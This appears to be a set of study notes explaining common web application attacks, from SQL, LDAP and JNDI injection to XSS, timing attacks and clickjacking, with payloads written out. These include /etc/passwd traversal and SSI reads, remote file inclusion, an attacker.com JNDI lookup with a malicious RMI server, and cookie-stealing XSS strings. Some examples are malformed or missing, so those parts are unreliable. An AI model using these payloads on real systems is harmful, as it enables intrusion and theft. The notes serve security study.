# 💣 Web Application Attacks 
The following are various web application attacks: 

## Directory Traversal 
Directory traversal is a type of attack where an attacker accesses files and folders outside the intended area of a web application. By manipulating the URL or input fields, the attacker can move through directories on the server (using sequences like `../`) to reach sensitive files such as source code, configuration files, or system files. This can lead to exposure of critical data or even allow command execution outside the web server's root directory. With this level of access to web application architecture, an attacker can
- Enumerate the contents of files and directories
- Access pages that otherwise require authentication (and possibly payment)
- Gain secret knowledge of the application and its construction
- Discover user IDs and passwords stored in hidden files
- Locate source code and other interesting files left on the server
- View sensitive data such as customer information

**Example:** <br>
The following example uses `“../”` to go back to several directories and obtain a file containing the backup of a web application: `http://www.targetsite.com/../../../sitebackup.zip` <br>
This example obtains the `“/etc/passwd”` file from a UNIX/Linux system, which contains user account information: `http://www.targetsite.com/../../../../etc/passwd` <br>
Let us consider another example in which an attacker tries to access files located outside a web publishing directory using directory traversal: 
```
http://www.certifiedhacker.com/process.aspx?page=../../../../some dir/some file
http://www.certifiedhacker.com/../../../../some dir/some file
```

## Hidden Field Manipulation Attack 
Hidden field manipulation is an attack where hackers change hidden values in web forms, often found on e-commerce websites. These hidden fields store information like product prices or discounts that aren’t visible to users but are sent to the server during form submission. Attackers inspect the page’s HTML, modify these hidden values (like lowering a price), and then submit the form with the altered data. If the server doesn’t properly validate the data, the attacker can complete transactions at manipulated prices.

**Example** <br>
A particular mobile phone might be offered for $1000 on an e-commerce website, but the hacker, by altering some of the hidden text in its price field, purchases it for only $10. Such attacks result in severe losses for website owners, even though they might be using the latest anti-virus software, firewalls, IDS, and so on to protect their networks from attacks. Besides financial losses, the owners can also lose their market credibility. An example of such code is given below: 
```html
<form method="post" action="page.aspx"> 
<input type="hidden" name=“PRICE" value=“200.00">
    Product name: <input type="text" name=“product” 
    value=“Certifiedhacker Shirt"><br> 
  Product price: 200.00"><br> 
<input type="submit" value="submit"> 
</form>
```
1. Open the html page within an HTML editor. 
2. Locate the hiddenfield (e.g. "<type=hidden name=price value=200.00>"). 
3. Modify its content to a different value (e.g. `"<type=hidden name=price value=2.00>"`). 
4. Save the html file locally and browse it. 
5. Click the Buy button to perform electronic shoplifting via hidden manipulation.

## Pass-the-Cookie Attack 
A Pass-the-Cookie attack happens when an attacker steals a valid session cookie from a user's browser and uses it to access the user's web account without needing to log in or go through multi-factor authentication. Since the server trusts the cookie as proof of authentication, the attacker can use it to impersonate the user and bypass all login checks.

Attackers can steal cookies using phishing, malware, or special tools. For example, Firefox stores cookies in a local database, which can be accessed using tools like `firefox_creds`. If the cookie is a session cookie, the attacker can hijack the session to gain access. Tools like Mimikatz can also extract encrypted cookies from memory for similar attacks.

## Same-Site Attack
Same-site attacks happen when an attacker takes control of a misconfigured or unused subdomain of a trusted website, often using familiar domains like .com, .org, or .edu. The attacker then creates a fake page that looks like a legitimate part of the main website. Because the subdomain shares the same top-level domain, users are easily tricked into thinking the page is safe.

These attacks are dangerous because subdomains under the same main domain (eTLD+1) can also share cookies. This allows attackers to steal cookies or session data. The attacker may use phishing, malware, or JavaScript abuse to compromise these subdomains, especially when users rely on dynamic DNS services.

### Same-Site Attack Scenario 
 In a Same-site attack, the attacker redirects a user attempting to browse www.certifiedhacker.com to an attacker-controlled dangling site, rans.certifiedhacker.com. The malicious link shares a common domain name, which lures the user into believing that the redirected site is the secure or legitimate one. Then, the attacker can perform security policy intrusion, credential sniffing, phishing, and malware injection attacks by taking over subdomains.

## SQL Injection Attacks 
SQL injection is an attack where an attacker inserts malicious SQL code into input fields of a web application to manipulate the backend database. This happens when the application doesn’t properly check user input before using it in SQL queries. For example, a normal query like:

`SELECT * FROM tablename WHERE UserID = 2302`

can be changed by an attacker to:

`SELECT * FROM tablename WHERE UserID = 2302 OR 1=1`

The added `OR 1=1` always returns true, so the query returns all user data instead of just one. This allows attackers to bypass authentication or access sensitive information directly from the database through things like form fields, URL parameters, or search boxes.

SQL injection attacks allow attackers to
- Log into the application without supplying valid credentials
- Perform queries against data in the database, often even data to which the application would not normally have access
- Modify database contents or drop the database altogether
- Use the trust relationships established between the web application components to access other databases

## Command Injection Attacks 
Command injection is a type of attack where attackers insert malicious commands into a web application, which are then passed to the server’s operating system, shell, or database for execution. This happens when a web application fails to properly validate user input and allows direct interaction with system functions or external programs like sendmail. Attackers take advantage of this by inserting harmful characters or code, which the application unknowingly runs. This can lead to serious damage, such as unauthorized access, data theft, or system compromise. This attack is common and easy to perform but can be hard to fully detect and prevent if input is not properly sanitized.

The following are some types of command injection attacks: 
- **Shell Injection**
    - An attacker tries to craft an input string to gain shell access to a web server
    - Shell injection functions include `system()`, `StartProcess()`, `java.lang.Runtime.exec()`, `System.Diagnostics.Process.Start()`, and similar APIs
      
- **HTML Embedding**
    - This type of attack is used to deface websites virtually. Using this attack, an attacker adds extra HTML-based content to the vulnerable web application
    - In an HTML embedding attack, the user input to a web script is placed into the output HTML without being checked for HTML code or scripting

- **File Injection**
    - The attacker exploits this vulnerability and injects malicious code into system files `http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evi l/exploit?`

### Command Injection Example 
An attacker enters the following malicious code (account number) with a new password.
```
www.certifiedhacker.com/banner.gif||newpassword||1036|60|468
``` 
The last two sets of numbers denote the banner size. Once the attacker clicks the submit button, the password for the account 1036 is changed to “newpassword." The server script assumes that only the URL of the banner image file is inserted into that field.

## File Injection Attack 
A file injection attack happens when a web application allows users to choose which file to include or load, but doesn’t properly check the input. This can lead to serious security issues, especially when external or untrusted files are loaded and executed. Attackers take advantage of this by injecting a malicious file path or URL, often containing harmful scripts, into the application's input field.

For example, in PHP, many developers use the `require()` function to include files dynamically based on user input. Consider a vulnerable PHP script where the file to be included is decided by the value selected in a dropdown form:

```html
<form method="get"> 
  <select name="DRINK">
    <option value="pepsi">pepsi</option> 
    <option value="coke">coke</option> 
  </select> 
  <input type="submit"> 
</form>
```

The server-side PHP code takes the selected option and loads a file with that name followed by `.php`:

```php
<?php
$drink = 'coke'; 
if (isset($_GET['DRINK'])) 
    $drink = $_GET['DRINK']; 
require($drink . '.php');
?>
```

If the user selects "pepsi", it includes `pepsi.php`. But since the input isn’t validated, an attacker can modify the `DRINK` parameter and enter a URL like:

```
http://www.certifiedhacker.com/orders.php?DRINK=http://jasoneval.com/exploit?
```

This tricks the server into loading and executing the remote file `exploit?` from `jasoneval.com`, which may contain malicious PHP code. This results in the attacker gaining unauthorized control or access.

This vulnerability is common in PHP because it heavily uses file includes, and insecure configurations can make remote file inclusion easy for attackers.

## LDAP Injection Attacks
**LDAP (Lightweight Directory Access Protocol)** is a protocol used to access and manage directory services. It organizes data in a tree-like structure, where each entry contains information based on attributes, such as names, emails, or device IDs. LDAP works on a client-server model, where clients send requests to the LDAP server, usually to search for or manage directory entries. Filters are used to find specific information quickly and efficiently within this structured directory.

<img width="372" height="399" alt="image" src="https://github.com/user-attachments/assets/4bed0b26-40c2-4b96-8d04-42af46557041" />

LDAP injection is similar to SQL injection but targets LDAP (Lightweight Directory Access Protocol) queries instead of databases. It happens when a web application takes user input and includes it directly in an LDAP query without proper validation. This allows an attacker to inject malicious LDAP code into the query.

Since LDAP is used to access and manage directory services like user accounts or organizational data, a vulnerable web application that builds LDAP queries based on user input can be tricked. The attacker manipulates the input to change the structure of the LDAP filter. This can give them unauthorized access to sensitive information in the directory.

For example, if a login form uses an LDAP query to check usernames and passwords, and the input isn’t validated, an attacker could input special characters to bypass authentication or retrieve directory data they shouldn’t have access to. These attacks are often carried out using tools or local proxies to observe how the application builds LDAP queries and to craft inputs that exploit those patterns.

Depending on the implementation of the target, attackers use LDAP injection to achieve:
- Login bypass
- Information disclosure
- Privilege escalation
- Information alteration


For example, consider a login system that builds LDAP queries like this:
`(&(USER=USERNAME)(PASS=PASSWORD))`.

If a user enters a normal username like `certifiedhacker`, the query becomes:
`(&(USER=certifiedhacker)(PASS=blah))`.

However, an attacker can input: `certifiedhacker)(&)` as the username. This changes the query to:
`(&(USER=certifiedhacker)(&))(PASS=blah))`.

The LDAP server only processes the first part: `(&(USER=certifiedhacker)(&))`, which is always true. This means the password check is ignored, allowing the attacker to log in without a valid password.

<img width="501" height="149" alt="image" src="https://github.com/user-attachments/assets/a9d56b81-3805-441a-97e9-7b17d2bd5375" />

To prevent such attacks, all user inputs must be properly validated and filtered before being included in LDAP queries. Without this, attackers can execute unauthorized LDAP operations with the same permissions as the web application.

## Other Injection Attacks 
Some other types of injection attacks are discussed below: 

### Server-Side JS Injection 
Server-side JavaScript injection happens when user input is directly used in server-side JavaScript code without proper validation. Attackers exploit this by injecting malicious JavaScript that the server executes, allowing them to change the application's behavior, access sensitive data, or take control of the server. This can also be used to launch further attacks within the network.

For example, if the server uses `eval()` to process user input, an attacker can inject code like:
```js
while(1)
```
This creates an infinite loop, causing a Denial of Service (DoS) by locking the server's event loop and making it unresponsive.

Attackers can also access server files using built-in Node.js modules like `fs` (file system). By injecting:
```js
res.end(require('fs').readdirSync('.').toString())
```
they can list files in the current directory. Or use:
```js
res.end(require('fs').readdirSync('..').toString())
```
to list files in the parent directory.

Once they know the file names, they can read file contents with:
```js
res.end(require('fs').readFileSync('filename'))
```
Further, using both `fs` and `child_process` modules, attackers can run malicious binary files on the server, gaining deeper access or control.

This makes insecure eval usage highly dangerous on the server side.

### Server-Side Includes Injection 
Server-Side Includes (SSI) allow web developers to automatically add content to web pages using special directives like `#include` or `#echo`. If a web application uses user input directly in these directives without proper validation, attackers can inject malicious SSI commands. This can let them run server commands, access sensitive files like `/etc/passwd`, or alter data. For example, an attacker could inject `<!--#exec cmd="cat /etc/passwd"-->` to read system files if the server processes the input without filtering it.

### Server-Side Template Injection 
Server-Side Template Injection (SSTI) happens when a web application allows user input to be inserted directly into server-side templates without proper validation. Template engines are used to separate how data is shown (like HTML) from the application logic. They help in creating dynamic pages by replacing placeholders (like `{{title}}` or `{{username}}`) with actual values, such as content from a database or cookies.

The problem occurs when user input is directly included in these templates and interpreted as code by the template engine. If the input isn’t sanitized, attackers can inject malicious template expressions that the server interprets and executes. This can allow them to run system commands, steal data, or take full control of the server.

For example, consider this HTML form that uses template variables:
```html
<html> 
<head>
<title>{{title}}</title> 
</head>
<body>
<form method="{{method}}" action="{{action}}"> 
  <input type="text" name="user" value="{{username}}"> 
  <input type="password" name="pwd" value=""> 
  <button type="submit">Submit</button> 
</form>
<p>This page took {{microtime(true) - time}} seconds to render.</p>
</body> 
</html> 
```
This code is not secure if the template variables are filled using direct user input. In the backend, this data might be loaded like this:
```php
$templateEngine = new TemplateEngine(); 
$template = $templateEngine->loadFile('SignUp.tpl'); 
$template->assign('title', 'login'); 
$template->assign('method', 'post'); 
$template->assign('action', 'SignUp.php'); 
$template->assign('username', getUsernameFromCookie()); 
$template->assign('time', microtime(true)); 
$template->show();
```
If `getUsernameFromCookie()` returns input from a user-controlled cookie and it's not sanitized, an attacker could craft a value like `{{system('ls')}}` to try running system commands. If successful, the server would execute that command because the template engine treats it as executable code.

This kind of vulnerability is dangerous because it targets the server itself, not just the webpage. If exploited, it can lead to remote code execution and full compromise of the server hosting the application.

### Log Injection 
Log injection is an attack where hackers insert fake or malicious content into application logs by exploiting unvalidated or unsanitized user inputs. Most applications generate various logs like access, error, or transaction logs to record system activities. If these inputs are not properly checked, attackers can insert false data into the logs to mislead administrators or hide their actions during or after an attack.

For example, a web application may log user activity in this format:
`Date, Time, Username, ID, Source IP, Request`

Suppose the application pulls the "id" parameter directly from the user’s request without validation. A normal cookie might look like this:
`Cookie: PHPSESSID=xyz; username=admin; id=Walkin`

An attacker can manipulate the "id" field by injecting special characters like a newline (`\r\n`) to split the log entry and insert fake or misleading data. Example malicious input:
`Cookie: PHPSESSID=xyz; username=admin; id=\r\n(Fake input)`

This adds a fake line to the log, making it seem like a legitimate action occurred when it didn’t. Another trick is using a null byte (`%00`) to stop the rest of the log from being recorded:
`Cookie: PHPSESSID=xyz; username=admin; id=%00`

This can prevent the complete log entry from being saved, helping the attacker hide traces of the real activity. Applications must properly sanitize input before writing it to logs to avoid such attacks.

### HTML Injection
HTML injection is a type of attack where an attacker inserts harmful HTML code into a vulnerable web page, usually through form fields or user input areas. This attack doesn't use scripting languages like JavaScript but instead focuses on modifying how the page looks or behaves using standard HTML elements.

For example, if a web application displays search results using the following code:
```html
<html>
<h1>Results matching the given query:</h1>
<h2>{user_query}</h2>
<ol>
  <li>Result A</li>
  <li>Result B</li>
</ol>
</html>
```
An attacker might enter this as the search input:
```
</h2>special offer <a href=www.certifiedhacker.com>malicious link</a><h2>
```
This changes the resulting web page to:
```html
<html>
<h1>Results matching the given query:</h1>
<h2></h2> special offer <a href=www.certifiedhacker.com>malicious link</a><h2></h2>
<ol>
  <li>Result A</li>
  <li>Result B</li>
</ol>
</html>
```
This fake "special offer" link appears to users as part of the normal search results, but it actually redirects them to the attacker's site.

If the application saves and later displays user inputs—for example, in a search history page—the attack becomes more dangerous. Here’s a basic template:
```html
<html>
<h1>Recent search history:</h1>
<ol>
  <li><h2>{user_query_1}</h2></li>
  <li><h2>{user_query_2}</h2></li>
</ol>
</html>
```
If the attacker’s input was saved as:
```
</h2>special offer <a href=www.certifiedhacker.com>malicious link</a><h2>
```
The search history page would then show:
```html
<html>
<h1>Recent search history:</h1>
<ol>
  <li><h2>Top 10 thriller movies</h2></li>
  <li><h2></h2> special offer <a href=www.certifiedhacker.com>malicious link</a><h2></h2></li>
</ol>
</html>
```
This means every user visiting their search history could see and click the attacker’s fake link, leading to a malicious site that may steal their login information or other sensitive data.

### CRLF Injection
CRLF injection is a type of attack where an attacker adds special characters—carriage return (`\r`) and line feed (`\n`)—into user input to trick the system into thinking a new line or command has started. These characters are used to mark the end of a line in many Internet protocols, including HTTP.

When these characters are injected into input fields that are not properly sanitized, they can break the structure of HTTP headers or log files. This can lead to serious issues such as HTTP response splitting, request smuggling, and log file manipulation.

For example, consider a log entry that records the IP address, time, and the page visited like this:
```
10.10.10.10 - 09:25 - /index.php?page=about
```
If an attacker sends the following request:
```
/index.php?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=home&restrictedaction=edit
```
Here `%0d` and `%0a` are URL-encoded CR and LF characters. When processed, it creates a new line in the log:
```
10.10.10.10 - 09:25 - /index.php?page=about&
127.0.0.1 - 09:25 - /index.php?page=home&restrictedaction=edit
```
This tricks the system into logging a fake entry, making it look like a trusted IP performed a sensitive action. Attackers use this technique to hide their identity or confuse security teams by planting misleading data in logs.

### JNDI Injection 
JNDI Injection is a serious vulnerability in Java applications that allows attackers to take control of the system by injecting malicious object names into the JNDI lookup function. JNDI (Java Naming and Directory Interface) is used by Java apps to look up resources like LDAP entries, RMI objects, or other directory services using names provided as input. If the input is not properly validated, attackers can trick the application into connecting to a malicious server and loading dangerous code.

For example, in a vulnerable Java application, there might be code like this:
```java
@RequestMapping("/lookup")
public Object lookup(@RequestParam String name) throws Exception {
    return new javax.naming.InitialContext().lookup(name);
}
```
If an attacker sends a request to `/lookup?name=ldap://attacker.com/Object`, and the attacker’s server responds with a malicious object, the Java application will load and execute it. This allows the attacker to run arbitrary code on the server.

To exploit this, the attacker can run a malicious RMI server like this:
```java
public class MaliciousRMIServer {
    public static void main(String[] args) throws Exception {
        Registry myregistry = LocateRegistry.createRegistry(1097);
        Reference reff = new javax.naming.Reference(
            "ExportObject", 
            "ExportObject", 
            "http://www.certifiedhacker.com/"
        );
        ReferenceWrapper referenceWrap = new com.sun.jndi.rmi.registry.ReferenceWrapper(reff);
        myregistry.bind("Object", referenceWrap);
    }
}
```
When the vulnerable application makes a JNDI lookup, it connects to this malicious server, downloads the `ExportObject` class from the attacker's website, and executes it—leading to full remote code execution and a compromised system.

## Cross-Site Scripting (XSS) Attacks 
Cross-Site Scripting (XSS) is an attack where a hacker injects harmful scripts—like JavaScript—into web pages that other users visit. This happens when a website includes user input in its pages without properly checking or cleaning it.

When another user loads that page, the malicious script runs in their browser, allowing the attacker to steal sensitive data like cookies, session tokens, or even perform actions on behalf of the user. These scripts can also change the way a website looks or behaves. XSS takes advantage of weak input validation in dynamic web pages and can bypass security measures to target other users.

Some exploitations that can be performed by XSS attacks are as follows:
```
▪ Malicious script execution		▪ Session hijacking
▪ Redirecting to a malicious server	▪ Brute-force password cracking          
▪ Exploiting user privileges		▪ Data theft
▪ Ads in hidden IFRAMES and pop-ups	▪ Intranet probing 
▪ Data manipulation			▪ Keylogging and remote monitoring
```
### How XSS Attacks Work
XSS (Cross-Site Scripting) attacks happen when an attacker inserts malicious scripts into a website’s dynamic content. When a user visits the page, the browser mistakenly treats this script as part of the website and runs it.

This usually happens because dynamic web pages often include user input from things like URL parameters, form fields, cookies, or database data. If the server doesn’t properly filter or escape special characters like `<` and `>`, the browser interprets them as HTML or JavaScript instead of regular text.

When the browser executes the attacker’s script, it runs with the same permissions as the actual website. This allows the attacker to access sensitive data on the page, such as login details or cookies, and send it to a site they control.

### Cross-Site Scripting Attack Scenario: Attack via Email
In a cross-site scripting attack that employs email, the attacker crafts an email that contains a link to the malicious script and sends it to the victim, luring the victim into clicking the link containing the malicious script/query. For example, if the attacker finds a cross-site scripting vulnerability on the bank.com website, he/she constructs a link embedded with a malicious script such as

and sends an email to the target user. When the user clicks the link, the URL is sent to bank.com with the malicious code. The legitimate server hosting the bank.com website sends a page back to the user including the value of **clientprofile**, and the malicious code is executed on the client machine. The malicious code asks the victim to enter profile information. After the user enters all the necessary personal details and clicks **Submit**, the attacker receives the information. The attacker can use these details to impersonate the user to gain access to the user’s online bank account and perform other fraudulent activities.

### Techniques to Evade XSS Filters 
XSS filter evasion is a technique used by attackers to bypass security checks in browsers or web applications that try to block script injections. While modern browsers have strong protections, attackers can still exploit design flaws or weak server-side validation by injecting unusual characters or using creative HTML structures. Instead of using obvious script tags, attackers may hide malicious code in less suspicious tags or use HTML event handlers like `<onerror>`, `<onclick>`, or `<onfocus>` to run JavaScript. These tricks allow the attacker to sneak harmful code through filters and execute it in the user’s browser, often without being detected.

Various XSS filter evasion techniques are discussed below: 

#### Encoding Characters 
Attackers often hide malicious scripts using different encoding tricks to bypass security filters. Here are some commonly used encoding techniques:

1. **ASCII Encoding to Hide Keywords** <br>
   Attackers convert letters to ASCII codes so filters can't detect them.
   ```html
   <a href="&#106;javascript:alert('XSS Successful')">Click Here!</a>
   ```

2. **Hexadecimal Encoding to Evade Filters** <br>
   HTML elements are encoded in hexadecimal, often bypassing filters looking for `&#` with numbers.
   ```html
   <a href="&#6A;javascript:alert(document.cookie)">Click Here!</a>
   ```

3. **Base64 Encoding to Obfuscate Payloads** <br>
   Attackers use `atob()` to decode Base64-encoded scripts at runtime.
   ```html
   <body onload="eval(atob('U3VjY2Vzc2Z1bCBYU1M='))">
   ```

4. **Zero Padding in Character Codes** <br>
   Attackers use character codes with leading zeroes to confuse filters.

## Web-based Timing Attacks 
Web-based timing attacks are side-channel attacks where attackers try to steal sensitive information like passwords by measuring how long a server takes to respond. These attacks work by noticing small time differences in how the server handles certain operations, such as checking each character in a password. By analyzing these timing gaps, attackers can guess secrets step by step. This method can be used directly on web apps or indirectly through browsers and cross-site requests.

### Direct Timing Attack 
A direct timing attack takes advantage of how long a server takes to respond to login attempts. By measuring the response time after sending a POST request, an attacker can guess whether a username exists. They can also test passwords one character at a time—if the server takes slightly longer to respond, it means the guessed character is correct. Repeating this process helps the attacker slowly figure out the full password.

### Cross-site Timing attack 
A cross-site timing attack uses malicious JavaScript on a website to measure how long a user’s browser takes to access specific resources on another site. By analyzing the response time, an attacker can infer private information, such as whether the user has access to certain restricted pages. For example, if a site has private groups like `/the-prompt/` and `/the-anonymous-place/`, the attacker’s script can silently check which group the user can access based on how fast or slow the request responds, revealing sensitive details without the user's knowledge.

Sample JavaScript code used to perform this attack: 
```javascript
function getMeasurement(url, callback) {
    var a = new Image();
    var begin = performance.now();

    a.addEventListener('error', function () {
        var conclude = performance.now();
        callback(conclude - begin);
    });

    a.src = url;
}

getMeasurement('http://xyz.com/the-prompt/', function (timeTF) {
    getMeasurement('http://xyz.com/the-anonymous-place', function (timeTDS) {
        if (timeTF > timeTDS) {
            alert('The prompt is alright!');
        } else {
            alert('Privacy breach!');
        }
    });
});
```
### Browser-based Timing Attacks 
Browser-based timing attacks are a type of side-channel attack where attackers measure how long a browser takes to process certain resources, rather than focusing on how long it takes to download them. By carefully tracking the time between when a resource finishes downloading and when the browser finishes processing it, attackers can gather sensitive information about the user's system or behavior.

They exploit specific browser features and use this timing data to launch more advanced attacks, such as analyzing how videos are parsed or detecting which content is stored in the browser’s cache. These attacks are subtle but powerful, allowing attackers to infer protected data without directly accessing it.

#### Video-parsing Attack 
A video-parsing attack is a type of browser-based side-channel attack where the attacker tricks the victim's browser into trying to load non-video files as if they were video files. By measuring how long the browser takes to process these invalid files, the attacker can infer sensitive information about the target resource.

In this attack, the attacker uses JavaScript to create a `<video>` element and sets its source (`src`) to a target URL. When the browser starts to load the file, it triggers a `suspend` event if the file is small or stops downloading early. This marks the beginning of the timing measurement. The browser then tries to parse the file as a video, but since the file isn't a valid video format (like HTML or JSON), it fails and triggers an `error` event. This marks the end of the timing.

Here's the sample JavaScript used in this attack:
```javascript
function getMeasurement(url, callback) { 
  var p = document.createElement('video'); 
  var begin;
  p.addEventListener('suspend', function() { 
    begin = performance.now();
  }); 
  p.addEventListener('error', function() { 
    var conclude = performance.now(); 
    callback(conclude - begin);
  }); 
  p.src = url; 
}
```
By calculating the time difference between the `suspend` and `error` events, the attacker gets an estimate of how long the browser took to parse the file. One measurement may not be enough, so the attacker repeats this process multiple times and uses the average or median timing to analyze patterns.

This timing data can help attackers learn about the type or structure of files behind URLs, even if they can’t see the content directly.

#### Cache Storage Timing Attack
The **Cache Storage Timing Attack** is a side-channel technique where an attacker measures how long a browser takes to store a resource in its cache. Since larger files usually take longer to process, attackers can estimate the size of a fetched resource based on the delay. This small timing difference can reveal sensitive information without directly accessing the data.

For example, the following JavaScript code shows how this is done:
```javascript
function getMeasurement(url, callback) { 
    fetch(url, {mode: "no-cors", credentials: "include"}).then(function(resp) { 
        setTimeout(function() {
            caches.open('attackerfile').then(function(cache){ 
                var begin = performance.now();
                cache.put(new Request('myfoo'), resp.clone()).then(function() { 
                    var conclude = performance.now(); 
                    callback(conclude - begin);
                }); 
            }); 
        }, 2000); 
    }); 
}
```
This script fetches a URL and measures the time it takes to store the response in the cache. By calculating the time difference (`conclude - begin`), the attacker estimates the size of the response. If different responses have different sizes depending on secret data (e.g., user-specific content), the attacker can exploit this to infer or brute-force that information.

## Unvalidated Redirects and Forwards 
Unvalidated redirects and forwards happen when a website redirects or forwards users without properly checking the destination. Attackers take advantage of this by sending fake links that seem trustworthy. When a victim clicks the link, they are silently redirected to a malicious site that may steal their password or install malware. Unsafe forwards can also be used by attackers to bypass access controls and reach restricted parts of a site.

Unsafe forwarding may allow access control bypass, leading to the following: 

1. **Session Fixation Attack** → The attacker gives the victim a pre-set session ID and tricks them into using it. When the victim logs in, the attacker can hijack the session using that same ID.

2. **Security Management Exploits** → Attackers target weak security settings and gain access to modify, disable, or create new security rules, giving them control over the system or application.

3. **Failure to Restrict URL Access** → Sensitive features are hidden but not protected. Attackers can guess or access those URLs directly to perform unauthorized actions.

4. **Malicious File Execution** → Due to poor input validation, attackers upload or execute harmful files on the server. This can lead to remote code execution or full system compromise.

Unvalidated redirect and forwarding are security flaws where a website blindly trusts and uses input from a URL to redirect or forward users. In unvalidated redirect, attackers trick users with links that look safe (like starting with a real site), but silently redirect them to a malicious site that can steal data or install malware. In unvalidated forwarding, attackers craft a link that directly sends them to restricted pages within the same site—like an admin panel—bypassing security checks, because the site doesn't verify where it's forwarding the user.

## Cookie/Session Poisoning 
Cookie/session poisoning is an attack where hackers change the data stored in browser cookies to gain unauthorized access or impersonate other users. Cookies often hold sensitive info like user IDs, session tokens, or account details to keep users logged in. If not properly secured, attackers can modify these cookies using tools like proxies and trick the system into treating them as someone else—leading to account takeovers or stolen data. **Threats**

## DNS Rebinding Attack 
DNS rebinding is a technique attackers use to bypass the browser’s same-origin policy (SOP), which normally prevents websites from accessing internal or private networks. In this attack, a malicious website tricks the victim’s browser into thinking it's still communicating with the same site, but behind the scenes, the DNS response is changed to point to an internal IP address. This allows the attacker’s site to send requests to devices or services inside the victim’s private network, which would normally be inaccessible from the internet.

### How DNS Rebinding Works 
DNS Rebinding is a technique where an attacker tricks a victim’s browser into ignoring security rules and accessing internal systems. The attacker sets up a malicious website (like `certifiedhacker.com`) and uses a DNS server they control to give very short-lived IP addresses. When the victim visits the site, it first loads content normally. Then, JavaScript on the page makes the browser request more data from the same domain. But because of the short TTL, the browser rechecks the DNS, and this time the attacker gives it a new IP—usually an internal IP of a trusted system like `xyz.com`. The browser thinks it's still talking to the same domain and sends the request, allowing the attacker to bypass the browser's Same-Origin Policy and reach internal resources.

## Clickjacking Attack 
Clickjacking is a type of attack where a hacker tricks you into clicking something on a website without you realizing it. They do this by loading a trusted website inside a hidden or transparent frame (iframe) and placing fake buttons or links on top of it. When you think you're clicking a normal button, you're actually clicking something harmful—like approving a payment, sharing private info, or installing malware. This happens because the site doesn't block being loaded in a frame, often due to missing security settings like the X-Frame-Options header.

The various clickjacking techniques employed by attackers are listed below: 

1. **Complete Transparent Overlay** → The attacker places a see-through (transparent) version of a real page on top of a fake page using an invisible iframe and a high z-index, tricking users into clicking on the real buttons while thinking they’re interacting with something else.

2. **Cropping** → Only important parts of the real page (like buttons) are shown over the fake content. Attackers might hide real labels and replace them with fake ones, misleading users into performing unintended actions.

3. **Hidden Overlay** → A tiny (1×1 pixel) malicious iframe is secretly placed under the user’s mouse. When clicked, the action is actually registered on this hidden malicious element.

4. **Click Event Dropping** → The attacker makes the top (legit) page ignore clicks using `pointer-events: none`, so all clicks pass through to the hidden malicious page underneath.

5. **Rapid Content Replacement** → The attacker briefly hides a fake overlay just at the moment of a user’s click, allowing a hidden button underneath to capture the click, often requiring precise timing.

9. **JavaScript Hijacking** → Exploits weaknesses in the browser's security model to steal sensitive JSON data from another site.

10. **Cross-Site WebSocket Hijacking (CSWH)** → Lets an attacker hijack a WebSocket connection using a victim’s identity, sending and reading messages from a vulnerable app.

11. **Obfuscation Application** → Attackers hide their malicious code using encoding (like Base64 or Unicode) to bypass detection by security systems.

12. **Network Access Attacks** → Use network vulnerabilities to access or disrupt web apps in ways regular web traffic cannot.

13. **DMZ Protocol Attacks** → Attackers exploit weaknesses in the DMZ (a semi-secure zone) to reach internal networks, steal data, or deface websites.
